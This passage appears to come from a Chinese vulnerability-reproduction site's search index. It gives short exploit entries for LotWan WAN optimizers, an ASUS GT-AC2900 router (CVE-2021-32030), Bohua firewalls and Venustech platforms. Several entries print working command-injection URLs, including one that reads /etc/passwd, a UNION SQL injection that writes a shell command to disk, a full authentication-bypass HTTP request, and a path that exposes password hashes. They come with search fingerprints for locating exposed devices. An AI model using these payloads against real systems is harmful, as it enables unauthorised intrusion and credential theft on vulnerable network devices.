","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 /acc/check_instance_state.php?ins=;id\u003ecmd.txt 再访问 /acc/cmd.txt ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-check_instance_state.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华夏创新 LotWan广域网优化系统 static_arp.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 华夏创新 LotWan广域网优化系统 static_arp.php文件参数 ethName存在命令拼接，导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 华夏创新 LotWan广域网优化系统 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"LotWan 广域网优化系统\" ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 /acc/bindipmac/static_arp.php?ethName=||id\u003ecmd.txt|| 再访问 /acc/bindipmac/cmd.txt ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华夏创新 LotWan广域网优化系统 static_arp_del.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 华夏创新 LotWan广域网优化系统check_instance_state.php文件参数 ins存在命令拼接，导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 华夏创新 LotWan广域网优化系统 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"LotWan 广域网优化系统\" ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 static_arp_del.php, 通过union注入写入文件 /acc/bindipmac/static_arp_del.php?x=1\u0026arpName=1' and 0 union select 1,'||id\u003ecmd.txt||',3,4,5,6,7,8-- 再访问 /acc/bindipmac/cmd.txt ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%A4%8F%E5%88%9B%E6%96%B0-lotwan%E5%B9%BF%E5%9F%9F%E7%BD%91%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F-static_arp_del.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华硕 GT-AC2900 身份验证绕过 CVE-2021-32030 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/"},{"categories":null,"content":"漏洞描述 ASUS GT-AC2900管理员应用程序在处理未经身份验证的用户的远程输入时，容易受到身份验证绕过漏洞的攻击，从而导致对管理员界面的未经授权的访问。 参考链接： https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md ","date":"0001-01-01","objectID":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/"},{"categories":null,"content":"漏洞影响 ASUS GT-AC2900韧体版本9.0.0.4.386.41994（测试版） ASUS GT-AC2900韧体版本3.0.0.4.386.41793（最新生产） ","date":"0001-01-01","objectID":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/"},{"categories":null,"content":"漏洞复现 通过在auth_check添加空字符进行绕过身份验证。 poc： GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1 Host: 192.168.1.107:8443 Content-Length: 0 User-Agent: asusrouter-- Connection: close Referer: https://192.168.1.107:8443/ Cookie: asus_token=\\0Invalid; clickedItem_tab=0 HTTP/1.0 200 OK Server: httpd/2.0 Content-Type: application/json;charset=UTF-8 Connection: close { \"get_cfg_clientlist\":[{\"alias\":\"24:4B:FE:64:37:10\",\"model_name\":\"GT-AC2900\",\"ui_model_name\":\"GT-AC2900\",\"fwver\":\"3.0.0.4.386_41793-gdb31cdc\",\"newfwver\":\"\",\"ip\":\"192.168.50.1\",\"mac\":\"24:4B:FE:64:37:10\",\"online\":\"1\",\"ap2g\":\"24:4B:FE:64:37:10\",\"ap5g\":\"24:4B:FE:64:37:14\",\"ap5g1\":\"\",\"apdwb\":\"\",\"wired_mac\":[ ... ... } ","date":"0001-01-01","objectID":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E7%A1%95-gt-ac2900-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87-cve-2021-32030/"},{"categories":null,"content":"博华网龙防火墙 cmd.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 博华网龙防火墙 cmd.php 过滤不足，导致命令拼接执行远程命令 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 博华网龙防火墙 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"博华网龙防火墙\" ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件为 /diagnostics/cmd.php \u003c?php include_once(\"pub/pub.inc\"); include_once(\"pub/session.inc\"); $username = $_SESSION[\"USER_NAME\"]; checkApproachUrl(); if($_GET['action'] == \"ping\") { $host = $_GET['host']; $count = $_GET['count']; system(\"/bin/ping -c $count \" . escapeshellarg($host).\" \u003etemp.htm\"); if($username) pSyslog(\"ping $host $count次\", 0); } else if($_GET['action'] == \"traceroute\") { $host = $_GET['host']; $ttl = $_GET['ttl']; $useicmp = $_GET['useicmp']; if($useicmp) $useicmp = \"-I\"; else $useicmp = \"\"; system(\"/usr/bin/traceroute -d $useicmp -w 2 -m \" . escapeshellarg($ttl) . \" \" . escapeshellarg($host).\" \u003etemp.htm\"); if($username) pSyslog(\"traceroute $host 跳数为$ttl\", 0); } else if($_GET['action'] == \"arping\") { $host = $_GET['host']; $count = $_GET['count']; $if = $_GET['ifName']; $src = $_GET['src']; system(\"/usr/bin/arping -I $if -c $count -s $src $host \u003etemp.htm\"); if($username) pSyslog(\"arping $host $count次\", 0); } else { system(\"echo \\\"\\\" \u003etemp.htm\"); } ?\u003e 可以发现其中存在多个命令执行点，均可进行命令拼接执行恶意命令 构造命令执行 /diagnostics/cmd.php?action=ping\u0026count=||id|| /diagnostics/cmd.php?action=arping\u0026ifName=|cat /etc/passwd|| ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"博华网龙防火墙 users.xml 未授权访问 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:0:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞描述 博华网龙防火墙 users.xml文件 可被任意用户读取，其中包含登录的账号密码 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:1:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞影响 博华网龙防火墙 ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:2:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"网络测绘 \"博华网龙防火墙\" ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:3:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC, 读取配置文件获取密码的Md5 /xml/users.xml ","date":"0001-01-01","objectID":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/:4:0","tags":null,"title":"","uri":"/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-users.xml-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"categories":null,"content":"启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 启明星辰 4A统一安全管控平台 getMaster.do 接口存在信息泄漏漏洞，通过发送特定请求包可以获取用户敏感信息 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 启明星辰 4A统一安全管控平台 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=“cas/css/ace-part2.min.css” ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /accountApi/getMaster.do ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4a%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getmaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"启明星辰 天清汉马USG防火墙 逻辑缺陷漏洞 CNVD-2021-12793 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/:0:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/"},{"categories":null,"content":"漏洞描述 启明星辰 天清汉⻢USG防⽕墙 存在逻辑缺陷漏洞，攻击者通过账号密码可以进入后台后更改任意用户权限升级为管理员。 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/:1:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/"},{"categories":null,"content":"漏洞影响 启明星辰 天清汉马USG防火墙 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/:2:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/"},{"categories":null,"content":"网络测绘 title=\"天清汉马USG防火墙\" ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/:3:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/"},{"categories":null,"content":"漏洞复现 登录后台后管理界面点击下面的图标 更改权限为任意用户,刷新后得到用户权限 ","date":"0001-01-01","objectID":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/:4:0","tags":null,"title":"","uri":"/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-%E5%A4%A9%E6%B8%85%E6%B1%89%E9%A9%ACusg%E9%98%B2%E7%81%AB%E5%A2%99-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E-cnvd-2021-12793/"},{"categories":null,"content":"启明星辰 天清汉马USG防火墙 默认口令漏洞 